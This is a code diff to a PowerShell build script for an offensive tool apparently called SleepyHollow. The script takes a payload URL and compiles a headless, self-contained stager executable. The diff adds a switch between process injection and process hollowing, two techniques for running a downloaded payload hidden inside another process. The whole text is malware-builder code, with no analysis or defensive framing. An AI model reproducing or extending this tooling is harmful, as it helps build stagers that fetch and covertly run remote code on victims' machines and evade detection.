@@ -2,7 +2,10 @@ param(
     [Parameter(Mandatory=$true)]
     [string]$PayloadUrl,
     [Parameter(Mandatory=$false)]
-    [string]$OutputPath = ".\SleepyHollow.exe"
+    [string]$OutputPath = ".\SleepyHollow.exe",
+    [Parameter(Mandatory=$false, HelpMessage="Technique to use for stager")]
+    [ValidateSet("Inject", "Hollow")]
+    [string]$Technique = "Hollow"
 )
 
 $oldContent = [System.IO.File]::ReadAllText(".\Program.cs")
@@ -50,7 +53,13 @@ function Output-Stager{
 
 function Build-Stager{
     $projectPath = ".\SleepyHollow.csproj"
-    dotnet publish -c Release /p:DefineConstants="HEADLESS" --self-contained $projectPath > $null
+    if($Technique -eq "Inject"){
+        $TECHNIQUE = "INJECT"
+    }
+    else{
+        $TECHNIQUE = "HOLLOW"
+    }
+    dotnet publish -c Release /p:DefineConstants="HEADLESS%3B$TECHNIQUE" --self-contained $projectPath > $null
 }
 
 Write-Progress -Activity "[SleepyHollow] Updating configuration..." -Status "20% Complete:" -PercentComplete 20
